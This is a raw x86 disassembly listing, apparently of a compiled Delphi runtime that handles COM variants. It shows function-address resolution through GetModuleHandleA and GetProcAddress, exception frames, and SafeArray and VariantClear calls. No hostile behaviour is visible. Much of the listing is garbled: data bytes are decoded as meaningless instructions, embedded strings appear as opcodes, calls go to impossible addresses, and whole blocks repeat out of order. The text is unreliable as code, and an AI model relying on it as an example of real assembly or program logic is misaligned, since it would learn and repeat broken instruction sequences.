xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4085c0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404904
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfdf
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40e008
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40e034
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40dba4
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbd4
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbd4
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbe0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbec
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbf8
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc64
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dcd0
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd3c
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dda8
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de14
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40de94
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df04
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40df74
mov eax r-xdata
call sub_40e008
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e340
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e365
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e36c
retn
sub_40e80a
inc eax
je r-xdata
popad
dec eax
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0x17004032 ]
dec bp
insd
outsd
jb r-xdata
dec eax
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0x18004032 ]
outsd
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x17 ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
jpe r-xdata
inc ebp
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
insd
outsd
jb r-xdata
popad
je r-xdata
add [ eax + 0x15004032 ] ah
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0xc0040 ] ah
add [ eax ] al
pushfd
in al 0x40
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax ] al
add [ eax ] al
outsd
inc ebp
push esi
popad
jb r-xdata
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x17004032 ] ah
jne r-xdata
jb r-xdata
inc ebp
push 0x6f727245
dec esi
jne r-xdata
jbe r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
retn
popad
outsb
je r-xdata
je r-xdata
inc eax
add ah bl
call sub_40e8d6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub st0
inc eax
add [ eax + eax ] cl
inc eax
dec edi
add [ eax ] al
pop eax
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
call 0x4ce8f6
outsd
jb r-xdata
shl [ ecx + ebp * 8 + 0x40 ] 0x0
call 0xffffffff8c2537b1
mov ebx eax
xor eax eax
push ebp
push sub_40eaa3
push [ fs : eax ]
insb
dec edi
jo r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1a004032 ] ah
inc ebp
push esi
popad
jb r-xdata
inc eax
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jmp 0x4ce9be
outsd
jb r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
outsb
add [ eax ] al
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
inc eax
jb r-xdata
inc eax
add [ eax + ebp * 8 + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ ebp - 0x5c1703bb ] cl
push esi
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414190
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414190
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eaaa
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040d0
retn
mov [ 0x640040ea ] eax
push [ eax ]
rcl [ ebp + 0x68 ] 0xa
0xff640040 0x6430
jb r-xdata
outsd
inc ebp
push esi
popad
jb r-xdata
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0x15004032 ]
jmp r-xdata
jns r-xdata
add [ eax ] al
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x18004032 ] ah
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x14004032 ] ah
inc ebp
push esi
popad
jb r-xdata
inc eax
jb r-xdata
jo r-xdata
popad
je r-xdata
jb r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 8 + 0x40 ] dh
add [ eax + eax ] cl
add [ eax ] al
pop eax
jpe r-xdata
outsd
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ eax ] dl
call sub_40e80a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
call 0x4ce82a
outsd
jb r-xdata
add [ eax ] al
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add al ah
xor al 0x40
dec ecx
inc eax
add [ eax + 0x40e7 ] ch
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x18004032 ] ah
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xe7
inc eax
add [ eax + eax ] cl
add [ eax ] al
pop eax
jpe r-xdata
outsd
jb r-xdata
add ah ch
xor al 0x40
add al dh
xor al 0x40
jb r-xdata
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
jb r-xdata
add [ eax ] al
add al ah
xor al 0x40
popad
outsb
je r-xdata
rol [ eax - 0x19 ] 0x40
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
popad
popad
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e7 ] ch
add [ eax ] al
add [ eax + 0x7a ] bl
inc eax
add [ eax ] al
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
jb r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x18004032 ] ah
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add [ eax + eax ] cl
add [ eax ] al
pop eax
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
out 0x40 eax
outsd
jb r-xdata
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0x17004032 ]
inc ebp
push esi
popad
jb r-xdata
out 0x40 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
out 0x40 al
add [ eax + eax ] cl
add [ eax ] al
pop eax
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x19 ] al
inc eax
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x15004032 ] ah
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
popad
outsb
je r-xdata
jns r-xdata
popad
sub_40e8d6
inc eax
add [ eax + 0x17004032 ] ah
inc ebp
push esi
popad
jb r-xdata
jae r-xdata
popad
outsb
je r-xdata
outsd
jb r-xdata
popad
je r-xdata
add [ eax + 0x15004032 ] ah
outsb
js r-xdata
push 0x6f727245
dec esi
jne r-xdata
jbe r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 8 + 0xc0040 ] ah
add [ eax ] al
pushfd
in al 0x40
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
shl [ ecx + ebp * 8 + 0x40 ] 0x0
call 0xffffffff8c2537b1
mov ebx eax
xor eax eax
push ebp
push sub_40eaa3
push [ fs : eax ]
insb
dec edi
jo r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x1a004032 ] ah
inc ebp
push esi
popad
jb r-xdata
inc eax
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
retn
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jmp 0x4ce9be
outsd
jb r-xdata
add [ ebp - 0x5c1703bb ] cl
push esi
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414190
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414190
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eaaa
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040d0
retn
mov [ 0x640040ea ] eax
push [ eax ]
rcl [ ebp + 0x68 ] 0xa
0xff640040 0x6430
jb r-xdata
outsd
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
outsb
inc ebp
push esi
popad
jb r-xdata
xor al [ eax ]
xor al [ fs : eax ]
mov al [ 0x15004032 ]
jmp r-xdata
inc eax
sub_40e9c0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ea0a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40ea14
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40eaa3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414190
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414190
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eaaa
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040d0
retn
sub_40eab0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eafa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb01
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40eb04
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eb4e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eb55
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40eb58
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ebe7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_414190
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_414190
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ebee
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_4040d0
retn
sub_40ebf4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40ec3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec45
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40ec48
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ee8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee94
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4040d0
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_4040d0
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
dec eax
je r-xdata
call sub_40e9c0
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
jmp r-xdata
call sub_40eab0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40b2d4
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
jmp r-xdata
jmp r-xdata
sub_40eea8
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40ea14
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40eb58
jmp r-xdata
jmp r-xdata
call sub_40ec48
sub_40eedc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_40277c
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
call sub_40277c
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40eea8
pop esi
pop ebx
retn
call sub_40277c
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov ecx esi
mov edx ebx
mov eax 0x8002000a
call sub_40eea8
jmp r-xdata
call sub_4027bc
mov edx eax
mov eax edx
call sub_403a64
mov ecx esi
mov edx ebx
mov eax 0x80020005
call sub_40eea8
jmp r-xdata
pop esi
pop ebx
retn
sub_40ef60
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40efaa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40badc
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40efb1
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40efc8
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40eff8
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40eff8
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40f054
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ee9c
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ee9c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40efc8
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ee9c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ee9c
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40eff8
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ee9c
mov eax [ ebp - 0x314 ]
call sub_40f24c
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40f1d0
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ee9c
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_4040ac
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_414760
test al al
je r-xdata
mov eax ebx
